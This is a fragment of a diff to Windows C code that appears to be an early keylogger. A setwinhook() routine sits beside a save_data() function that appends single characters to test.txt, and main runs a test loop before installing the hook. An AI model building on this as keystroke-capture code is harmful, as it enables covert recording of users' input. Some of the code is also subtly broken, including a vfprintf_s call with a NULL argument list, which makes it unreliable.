@@ -31,22 +31,47 @@ void	setwinhook()
 	CloseHandle(process.hThread);
 }
 
-void	save_data()
+void	save_data(char data)
 {
+	static int nbChar;
+
+	/* test time
+	static char timeBefore[9];
+
+	errno_t err;
+	_tzset();
+	err = _strtime_s(time, 9);
+	printf("OS time:\t\t\t\t%s\n", time);
+
+	*/
+
 	FILE *file;
 	if (_wfopen_s(&file, L"test.txt", L"a+") != 0)
-		_wperror(" Open file failed ");
+		_wperror(L" Open file failed ");
+
+	_write(_fileno(file), &data, 1);
+
+	if (nbChar == 61)
+	{
+		if (vfprintf_s(file, "\n", NULL) < 0)
+			_wperror(L" Add \\n at the end of the file failed ");
+		nbChar = 0;
+	}
 
 	if (fclose(file) != 0)
-		_wperror(" Close file failed ");
+		_wperror(L" Close file failed ");
 
-
-
+	nbChar++;
 }
 
 int	main(void)
 {
 	MSG msg;
+
+	for (int i = 0; i < 121; i++)
+	{
+		save_data('c');
+	}
 
 	setwinhook();				
 	while (GetMessage(&msg, NULL, 0, 0))
